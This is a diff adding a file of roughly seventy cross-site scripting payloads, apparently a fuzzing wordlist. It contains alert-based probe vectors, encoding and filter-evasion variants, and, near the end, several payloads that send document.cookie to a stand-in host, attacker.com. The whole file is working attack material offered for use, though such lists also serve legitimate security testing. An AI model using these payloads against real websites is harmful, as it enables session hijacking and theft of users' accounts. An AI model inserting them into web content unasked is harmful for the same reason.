@@ -1,0 +1,69 @@
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=prompt(1)>
+<body onload=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<select autofocus onfocus=alert(1)>
+<input autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<iframe src=javascript:alert(1)>
+<iframe srcdoc="<script>alert(1)</script>">
+<a href="javascript:alert(1)">click</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
+<form action="javascript:alert(1)"><input type="submit">
+<button formaction="javascript:alert(1)">click</button>
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<xss style="behavior:url(xss.htc)" onmouseover>
+<style>@import'javascript:alert(1)';</style>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<img src=1 onerror=setTimeout('alert(1)',0)>
+<img src=1 onerror=setInterval('alert(1)',0)>
+<svg><script>alert(1)</script></svg>
+<math><brute><script>alert(1)</script></brute></math>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg><a xmlns:xlink="http://www.w3.org/1999/xlink"><animate attributeName="xlink:href" values="javascript:alert(1)"/></a></svg>
+<svg><set attributeName="onbegin" to="alert(1)" begin="0"/></svg>
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
+<A HREF="//google">click</A>
+<ScRiPt>alert(1)</ScRiPt>
+<IMG SRC=# ONERROR="alert(1)">
+<IMG SRC=javascript:alert(1)>
+';alert(1);'
+";alert(1);"
+'-alert(1)-'
+"-alert(1)-"
+'-alert(1)//
+</script><script>alert(1)</script>
+--><script>alert(1)</script>
+-><script>alert(1)</script>
+%3Cscript%3Ealert(1)%3C/script%3E
+%253Cscript%253Ealert(1)%253C/script%253E
+<scr<script>ipt>alert(1)</scr</script>ipt>
+javas&#99;ript:alert(1)
+javas&#x63;ript:alert(1)
+data:text/html,<script>alert(1)</script>
+javascript:alert(document.cookie)
+onmouseover=alert(1)
+"onmouseover=alert(1)
+'onmouseover=alert(1)
+`onmouseover=alert(1)
+<img src=x onerror=alert(String.fromCharCode(88,83,83))>
+<svg/onload="(new Image()).src='//attacker.com/log?c='+document.cookie">
+<svg/onload=fetch('//attacker.com/?c='+document.cookie)>
+<img src=x onerror="document.location='http://attacker.com/?c='+document.cookie">
+<script>fetch('//attacker.com/log',{method:'POST',body:document.cookie})</script>
+<video><source onerror=fetch('//attacker.com/log?c='+document.cookie)>
+<iframe src="TARGET_URL" onload="alert(document.domain)"></iframe>
